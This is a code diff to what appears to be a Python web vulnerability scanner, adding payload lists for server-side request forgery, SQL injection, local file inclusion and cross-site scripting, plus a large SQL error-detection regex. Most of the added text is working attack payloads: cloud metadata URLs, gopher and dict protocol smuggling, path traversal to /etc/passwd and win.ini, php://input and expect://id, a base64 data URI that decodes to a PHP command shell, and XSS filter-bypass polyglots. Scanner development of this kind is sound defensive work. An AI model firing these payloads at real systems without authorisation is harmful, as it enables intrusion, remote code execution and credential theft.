@@ -146,6 +146,22 @@ _SSRF_PAYLOADS = [
     # Mixed notation bypass (hex + decimal + octal)
     "http://0x7f.0.0.1",
     "http://127.0x0.0x0.0x1",
+    # DNS rebinding via nip.io
+    "http://127.0.0.1.nip.io",
+    # URL parser confusion
+    "http://127.0.0.1:80%40google.com",
+    "http://127.0.0.1%23@google.com",
+    "http://google.com%2f@127.0.0.1",
+    "http://127.0.0.1%252f@google.com",
+    # IPv6 mapped variants
+    "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    # Protocol smuggling
+    "gopher://127.0.0.1:25/_HELO",
+    "dict://127.0.0.1:11211/stat",
+    # Cloud metadata (additional providers)
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
+    "http://169.254.169.254/metadata/v1/",        # DigitalOcean
 ]
 
 _SSRF_INDICATORS = re.compile(
@@ -161,19 +177,147 @@ _SSRF_INDICATORS = re.compile(
 # ---------------------------------------------------------------------------
 
 _SQL_ERROR_RE = re.compile(
-    r"SQL syntax|ORA-\d{5}|PG::SyntaxError|mysql_fetch|"
-    r"sqlite3\.OperationalError|ODBC SQL Server|"
-    r"SQL command not properly ended|"
-    r"You have an error in your SQL|"
-    r"java\.sql\.SQLException|"
-    r"Unclosed quotation mark|"
-    r"unterminated string|"
+    # MySQL / MariaDB / Drizzle / MemSQL
+    r"SQL syntax.*?MySQL|"
+    r"Warning.*?\Wmysqli?_|"
+    r"MySQLSyntaxErrorException|"
+    r"valid MySQL result|"
+    r"check the manual that (corresponds to|fits) your (MySQL|MariaDB)|"
+    r"MySqlClient\.|"
+    r"com\.mysql\.jdbc|"
+    r"MemSQL does not support this type of query|"
+    # PostgreSQL
+    r"PostgreSQL.*?ERROR|"
+    r"Warning.*?\Wpg_|"
+    r"valid PostgreSQL result|"
+    r"Npgsql\.|"
+    r"PG::SyntaxError|"
+    r"org\.postgresql\.util\.PSQLException|"
+    r"ERROR:\s+syntax error at or near|"
+    r"ERROR: parser: parse error at or near|"
+    r"unterminated quoted string at or near|"
+    # Microsoft SQL Server
+    r"Driver.*? SQL[\-\_\ ]*Server|"
+    r"OLE DB.*? SQL Server|"
+    r"(\W|\A)SQL Server[^<]*?Driver|"
+    r"Warning.*?\W(mssql|sqlsrv)_|"
+    r"\bSQL Server[^<]*?[0-9a-fA-F]{8}|"
+    r"System\.Data\.SqlClient\.(SqlException|SqlConnection\.OnError)|"
+    r"Exception.*?\bRoadhouse\.Cms\.|"
+    r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}|"
+    r"com\.microsoft\.sqlserver\.jdbc|"
+    r"ODBC SQL Server Driver|"
+    r"ODBC Driver.*? for SQL Server|"
+    r"SQLServer JDBC Driver|"
+    r"Unclosed quotation mark after the character string|"
+    r"Incorrect syntax near|"
+    # Oracle
+    r"\bORA-\d{5}|"
+    r"Oracle error|"
+    r"Oracle.*?Driver|"
+    r"Warning.*?\W(oci|ora)_|"
     r"quoted string not properly terminated|"
-    r"Microsoft OLE DB|"
-    r"PostgreSQL.*ERROR|"
-    r"Warning.*mysql_",
+    r"SQL command not properly ended|"
+    r"macromedia\.jdbc\.oracle|"
+    r"oracle\.jdbc|"
+    # IBM DB2
+    r"CLI Driver.*?DB2|"
+    r"DB2 SQL error|"
+    r"\bdb2_\w+\(|"
+    r"SQLCODE[=:\s][-\d]|"
+    r"com\.ibm\.db2\.jcc|"
+    r"Pdo[./_\\\\]Ibm|"
+    r"DB2Exception|"
+    r"ibm_db_dbi\.ProgrammingError|"
+    # SQLite
+    r"SQLite/JDBCDriver|"
+    r"SQLite\.Exception|"
+    r"(Microsoft|System)\.Data\.SQLite\.SQLiteException|"
+    r"Warning.*?\W(sqlite_|SQLite3::)|"
+    r"\[SQLITE_ERROR\]|"
+    r"SQLite error \d+:|"
+    r"sqlite3\.OperationalError|"
+    r"SQLite3::SQLException|"
+    r"org\.sqlite\.JDBC|"
+    r"Pdo[./_\\\\]Sqlite|"
+    # Informix
+    r"Warning.*?\Wifx_|"
+    r"Exception.*?Informix|"
+    r"Informix ODBC Driver|"
+    r"com\.informix\.jdbc|"
+    r"weblogic\.jdbc\.informix|"
+    # Firebird
+    r"Dynamic SQL Error|"
+    r"Warning.*?\Wibase_|"
+    r"org\.firebirdsql\.jdbc|"
+    # SAP MaxDB
+    r"SQL error.*?POS([0-9]+)|"
+    r"Warning.*?\Wmaxdb_|"
+    r"DriverSapDB|"
+    r"com\.sap\.dbtech\.jdbc|"
+    # Sybase
+    r"Warning.*?\Wsybase_|"
+    r"Sybase message|"
+    r"SybSQLException|"
+    r"com\.sybase\.jdbc|"
+    # Ingres
+    r"Warning.*?\Wingres_|"
+    r"Ingres SQLSTATE|"
+    r"IngresW.*?Driver|"
+    # Microsoft Access
+    r"Microsoft Access (\d+ )?Driver|"
+    r"JET Database Engine|"
+    r"Access Database Engine|"
+    r"ODBC Microsoft Access|"
+    # HSQLDB / H2
+    r"org\.hsqldb\.jdbc|"
+    r"Unexpected end of command in statement \[|"
+    r"Unexpected token.*?in statement \[|"
+    r"org\.h2\.jdbc|"
+    r"\[42000-192\]|"
+    # Apache Derby
+    r"org\.apache\.derby|"
+    r"ERROR 42X01|"
+    # Presto / Trino
+    r"com\.facebook\.presto\.jdbc|"
+    r"io\.prestosql\.jdbc|"
+    r"com\.simba\.presto\.jdbc|"
+    r"FAILED: SemanticException|"
+    # Vertica
+    r"com\.vertica\.jdbc|"
+    r", Currentposition: \d+, Error Code: \d+|"
+    r"com\.vertica\.JDBC|"
+    # MonetDB
+    r"\[MonetDB\]\[ODBC Driver|"
+    r"nl\.cwi\.monetdb\.jdbc|"
+    # Virtuoso
+    r"Virtuoso S0002 Error|"
+    r"\[(Virtuoso Driver|Virtuoso iODBC Driver)\]|"
+    # Generic patterns
+    r"SQLSTATE\[\d+\]|"
+    r"Syntax error in string in query expression|"
+    r"A Database error occurred|"
+    r"UNION query has different number of fields|"
+    r"Unknown column .* in 'field list'|"
+    r"java\.sql\.SQLException|"
+    r"Zend_Db_(Adapter|Statement)_",
     re.I,
 )
+
+
+_SQLI_PAYLOADS = [
+    ("'", "single-quote"),
+    ('"', "double-quote"),
+    ("`", "backtick"),
+    ("')", "single-quote-paren"),
+    ("'))", "single-quote-double-paren"),
+    ('")', "double-quote-paren"),
+    ('"))', "double-quote-double-paren"),
+    ("`)", "backtick-paren"),
+    ("`))", "backtick-double-paren"),
+    ("\\", "backslash"),
+    ("[]", "brackets"),
+]
 
 
 async def test_sqli(
@@ -189,7 +333,7 @@ async def test_sqli(
         baseline_len = len(baseline_body)
 
         # Phase 1: Error-based — inject single quote
-        for quote_char, quote_name in [("'", "single-quote"), ('"', "double-quote")]:
+        for quote_char, quote_name in _SQLI_PAYLOADS:
             test_url = _replace_param(target_url, param, f"{original_value}{quote_char}")
             status, body, _ = await _send(session, test_url)
             if status == 0:
@@ -496,12 +640,19 @@ _LFI_PAYLOADS_LINUX = [
     "/etc/passwd%00.jpg",
     "/etc/passwd%00.html",
     "../../../../../../etc/passwd%00",
+    # Null byte with HTML extension (PHP < 5.3.4)
+    "../../../../../../etc/passwd%00.html",
     # UTF-8 overlong encoding
     "..%c0%af..%c0%afetc/passwd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
     # PHP wrappers
     "php://filter/convert.base64-encode/resource=/etc/passwd",
     "php://filter/convert.base64-encode/resource=index",
     "php://filter/read=string.rot13/resource=/etc/passwd",
+    "php://input",
+    "expect://id",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
     # proc filesystem (Python/Node/Java apps)
     "/proc/self/environ",
     "/proc/self/cmdline",
@@ -528,6 +679,14 @@ _LFI_PAYLOADS_WINDOWS = [
     "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
     "../../../../../../Windows/System32/drivers/etc/hosts",
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    # Double encoding (Windows)
+    "..%255c..%255c..%255cWindows%255cwin.ini",
+    # Null byte (Windows)
+    "..\\..\\..\\..\\Windows\\win.ini%00",
+    "..\\..\\..\\..\\Windows\\win.ini%00.html",
+    # UNC path
+    "\\\\localhost\\c$\\Windows\\win.ini",
 ]
 
 # Base64-encoded /etc/passwd starts with "cm9vd" (base64 of "root:")
@@ -780,6 +939,34 @@ _REFLECTED_XSS_PAYLOADS = [
     (f'javascript:void("{_XSS_MARKER}")', f'javascript:void("{_XSS_MARKER}")'),
     # HTML tag injection (basic — confirms tag injection possible)
     (f"<b>{_XSS_MARKER}</b>", f"<b>{_XSS_MARKER}</b>"),
+    # --- Attribute context breakout payloads ---
+    (f'" onmouseover="{_XSS_MARKER}" x="', f'onmouseover="{_XSS_MARKER}"'),
+    (f"' onfocus='{_XSS_MARKER}' autofocus='", f"onfocus='{_XSS_MARKER}'"),
+    (f'" onmouseenter="{_XSS_MARKER}"', f'onmouseenter="{_XSS_MARKER}"'),
+    (f"' onclick='{_XSS_MARKER}'", f"onclick='{_XSS_MARKER}'"),
+    (f'" style="background:url(javascript:{_XSS_MARKER})"', f"javascript:{_XSS_MARKER}"),
+    # --- JavaScript context breakout payloads ---
+    (f"';{_XSS_MARKER}//", f";{_XSS_MARKER}//"),
+    (f'";{_XSS_MARKER}//', f';{_XSS_MARKER}//'),
+    (f"\\';{_XSS_MARKER}//", f";{_XSS_MARKER}//"),
+    (f'\\";{_XSS_MARKER}//', f';{_XSS_MARKER}//'),
+    (f"</script><script>{_XSS_MARKER}</script>", f"<script>{_XSS_MARKER}</script>"),
+    # --- URL context payloads ---
+    (f"javascript:{_XSS_MARKER}", f"javascript:{_XSS_MARKER}"),
+    (f"data:text/html;base64,{_XSS_MARKER}", f"data:text/html;base64,{_XSS_MARKER}"),
+    # --- Template context (Angular/Vue) ---
+    (f"{{{{constructor.constructor('{_XSS_MARKER}')()}}}}", _XSS_MARKER),
+    (f"${{{{`{_XSS_MARKER}`}}}}", _XSS_MARKER),
+    # --- WAF bypass — polyglot payloads ---
+    (f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={_XSS_MARKER} )//", f"oNcliCk={_XSS_MARKER}"),
+    (f"<math><mtext><table><mglyph><svg><mtext><style><path id=\"{_XSS_MARKER}\">", _XSS_MARKER),
+    (f"<a/href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ript:{_XSS_MARKER}\">", f"ript:{_XSS_MARKER}"),
+    # --- Additional event handlers ---
+    (f"<marquee onstart={_XSS_MARKER}>", f"onstart={_XSS_MARKER}"),
+    (f"<video><source onerror={_XSS_MARKER}>", f"onerror={_XSS_MARKER}"),
+    (f"<select autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
+    (f"<textarea autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
+    (f"<keygen autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
 ]
 
 # Context detection: what kind of HTML context is the reflection in?
